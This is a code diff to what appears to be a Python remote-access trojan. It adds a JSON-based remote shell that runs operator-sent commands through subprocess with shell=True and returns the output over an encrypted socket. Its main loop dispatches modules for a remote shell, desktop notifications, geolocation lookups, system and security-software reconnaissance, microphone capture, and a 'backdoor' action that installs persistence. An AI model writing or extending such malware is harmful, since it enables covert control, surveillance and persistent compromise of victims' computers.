@@ -29,6 +29,7 @@ class STATUS:
 class TYPE:
     FILE = "file"
     JSON = "json"
+    SHELL = "shell"
 
 KEY = 'RANDOM_KEY'
 
@@ -160,13 +161,10 @@ def recv_exact(conn, n):
 
 def recv_command(conn, decode=True):
     try:
-        print("recv")
         size_data = recv_exact(conn, 4)
         size = struct.unpack('>I', size_data)[0]
-        print(size)
         data = recv_exact(conn, size)
         dec = decrypt(data)
-        print(dec)
         return dec.decode() if decode else dec
     except Exception as e:
         print(e)
@@ -177,22 +175,28 @@ def handle_shell(conn):
     while True:
         try:
             data = recv_command(conn)
-            if data == "exit":
+            task_obj = json.loads(data)
+            cmd_msg = task_obj.get('action')
+            if cmd_msg == "exit":
                 break
-            elif data == "SHELLINFO":
-                sendInput(conn)
-            elif data.startswith("cd "):
+
+            elif cmd_msg.startswith("cd "):
                 os.chdir(data[3:])
-                send_data(conn, os.getcwd().encode())
+                send_response(conn, msg_type=TYPE.SHELL, status=STATUS.SUCCESS,
+                              result={"output": "", "path": os.getcwd().encode()})
             else:
-                proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                proc = subprocess.Popen(cmd_msg, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                 stdout_value, stderr_value = proc.communicate()
                 output = stdout_value + stderr_value
                 if not output:
-                    output = "<No output>\n"
-                send_data(conn, output)
+                    send_response(conn, msg_type=TYPE.SHELL, status=STATUS.SUCCESS,
+                                    result={"output": "", "path": os.getcwd().encode()})
+                    continue
+                send_response(conn, msg_type=TYPE.SHELL, status=STATUS.SUCCESS,
+                              result={"output": output, "path": os.getcwd().encode()})
         except Exception as error:
-            send_data(conn, f"[-] Error: {error}".encode())
+            send_response(conn, msg_type=TYPE.SHELL, status=STATUS.FAILURE, error=error,
+                          result={"output": "", "path": os.getcwd().encode()})
 def handle_mic(conn):
     try:
         duration = 5
@@ -506,23 +510,25 @@ def main():
                             action = task_obj.get('action')
                             task_id = task_obj.get('task_id')
                             args = task_obj.get('args', {}) or {}
-                            if module == 'notification' and action == 'send':
+                            if module == 'shell' and action == 'run':
+                                handle_shell(s)
+                            elif module == 'notification' and action == 'send':
                                 send_notification(s, args.get('title'), args.get('message'), args.get('app'))
                                 continue
-                            if module == 'geo' and action == 'get':
+                            elif module == 'geo' and action == 'get':
                                 try:
                                     r = requests.get('https://ipinfo.io/json')
                                     send_response(s, status=STATUS.SUCCESS, result={'result': r.text})
                                 except Exception as e:
                                     send_response(s, status=STATUS.FAILURE, error="[-] Failed to get location")
                                 continue
-                            if module == 'secinfo' and action == 'get':
+                            elif module == 'secinfo' and action == 'get':
                                 get_security_info(s)
                                 continue
-                            if module == 'sysinfo' and action == 'get':
+                            elif module == 'sysinfo' and action == 'get':
                                 get_system_info(s)
                                 continue
-                            if module == 'System' and action in ('backdoor','delete'):
+                            elif module == 'System' and action in ('backdoor','delete'):
                                 if action == 'backdoor':
                                     add_persistence(s)
                                 else:
